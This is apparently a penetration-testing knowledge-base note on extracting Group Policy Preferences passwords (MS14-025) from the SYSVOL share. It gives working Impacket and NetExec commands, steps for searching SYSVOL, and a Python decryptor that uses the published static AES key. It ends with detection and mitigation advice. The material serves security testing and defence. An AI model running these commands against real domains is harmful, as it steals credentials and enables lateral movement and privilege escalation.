---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1552.006"
  - "#stage/credential-access"
  - "#stage/lateral-movement"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#tool/impacket"
  - "#tool/netexec"
  - "#protocol/smb"
aliases:
  - Group Policy Preferences Password
  - MS14-025
  - SYSVOL Credentials
  - GPP Passwords
---

## Technique
___

Group Policy Preferences (GPP) Password extraction exploits a vulnerability (MS14-025) in the way Windows stores passwords in Group Policy Preference files. When administrators configure certain Group Policy settings that require passwords (such as creating local accounts, scheduled tasks, or mapped drives), these passwords are stored in XML files within the SYSVOL share, which is accessible to all authenticated domain users.

Although the passwords in these files are "encrypted" using AES, Microsoft published the static AES key used for this encryption, making it trivial to decrypt these passwords once the XML files are obtained.

## Prerequisites
___

**Access Level:** 
- For remote enumeration: Any authenticated domain user access
- For local enumeration: Local system access to a domain-joined computer with cached Group Policy files

**System State:** The target domain must have Group Policy Preferences containing passwords created before the MS14-025 patch (May 2014) or created using pre-patch tools.

## Identification and Exploitation
___
https://github.com/TheManticoreProject/FindGPPPasswords

### Remote Enumeration with Impacket

Check for GPP passwords without credentials (if null sessions are allowed):
```bash
impacket-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
```

With credentials:
```bash
impacket-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

### Using NetExec

Check for GPP autologin credentials:
```bash
nxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin
```

### Manual Enumeration

1. Access the SYSVOL share:
```bash
# Mount the share
mount -t cifs //domain-controller/SYSVOL /mnt/sysvol -o username=user,password=pass

# Or access directly
smbclient //domain-controller/SYSVOL -U user%pass
```

2. Search for potential files containing passwords:
```bash
find /mnt/sysvol -name "*.xml" | xargs grep -l "cpassword"
```

Common files to check:
- Groups.xml (Local group accounts)
- Services.xml (Service accounts)
- Scheduledtasks.xml (Scheduled tasks)
- Datasources.xml (Data sources)
- Printers.xml (Printer connections)
- Drives.xml (Drive maps)

### Decrypting the Password

Once you find a cpassword value in an XML file, you can decrypt it:

Using gpp-decrypt:
```bash
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
```

Using manual decryption in Python:
```python
from Crypto.Cipher import AES
import base64
import binascii

# Static AES key published by Microsoft
key = binascii.unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
cpassword = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

# Decrypt the password
def decrypt(cpassword):
    # Add padding if needed
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    
    # Decode and decrypt
    password = base64.b64decode(cpassword)
    
    # Create AES object and decrypt
    cipher = AES.new(key, AES.MODE_CBC, b'\x00' * 16)
    decrypted = cipher.decrypt(password)
    
    # Remove PKCS7 padding
    padding = decrypted[-1]
    if padding > 16:
        return decrypted.decode('utf-16le')
    return decrypted[:-padding].decode('utf-16le')

print(decrypt(cpassword))
```

## Cached GPP Files on Endpoints

Even if a GPP setting is deleted rather than properly unlinked, cached copies of the XML files may remain on endpoints that received the policy. Check these locations on local systems:

```
C:\ProgramData\Microsoft\Group Policy\History
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History
```

## Detection & Mitigation
___

### Detection

- Scan the SYSVOL share for XML files containing the "cpassword" attribute
- Monitor access to SYSVOL shares, especially enumeration of XML files
- Look for tools commonly used to exploit this vulnerability (gpp-decrypt, PowerSploit)

### Mitigation

1. **Remove existing password-based GPP settings:**
   - Identify all GPP XML files with cpassword attributes
   - Delete these settings through Group Policy Management Console
   - Remove the XML files from SYSVOL manually if needed

2. **Ensure MS14-025 patch is applied** to all domain controllers

3. **Use alternative approaches:**
   - For local accounts: Use LAPS (Local Administrator Password Solution)
   - For service accounts: Use managed service accounts
   - For scheduled tasks: Use task scheduler with proper security context

4. **Audit Group Policy Objects** regularly for insecure settings

5. **Implement least privilege** for domain user accounts to limit access to sensitive areas